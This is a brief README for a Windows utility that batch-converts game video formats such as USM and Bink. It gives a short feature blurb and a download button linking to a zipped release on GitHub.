...
<img src="preview.svg" alt="Video" width="100%"/>

# Video

**Video / USM / Bink batch convert — Windows desktop utility with batch export workflow**
...
**Video** is a Windows-focused desktop utility for **video / usm / bink batch convert**. Point it at a local game folder or archive, pick an export preset, and run a batch job — no manual hex editing required.
...
[![Download](button.svg)](https://github.com/GanLunaretta/video-usm-bink-batch-convert/releases/download/v3.7.3/video-usm-bink-batch-convert-v3.7.3.zip)
...
<div align="center">
<sub>Windows · Game asset tooling · Open Source · video-usm-bink-batch-convert</sub>
</div>
